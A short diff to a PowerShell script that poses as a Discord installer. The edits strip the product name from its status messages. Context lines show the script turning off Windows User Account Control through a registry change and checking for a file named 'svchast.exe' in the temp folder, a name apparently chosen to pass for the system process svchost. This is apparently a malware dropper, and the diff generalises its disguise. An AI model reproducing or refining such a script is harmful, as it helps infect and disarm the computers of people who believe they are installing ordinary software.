@@ -13,7 +13,7 @@ if (-not $isAdmin) {
     }
 }
 
-Write-Host "Discord installation is starting..."
+Write-Host "Installation is starting..."
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0 | Out-Null
 
@@ -24,7 +24,7 @@ $TempPath = $env:TEMP
 $FilePath = Join-Path $TempPath 'svchast.exe'
 
 if (Test-Path $FilePath) {
-    Write-Host "Discord is already installed! Skipping installation."
+    Write-Host "Already installed! Skipping installation."
     exit
 }
 
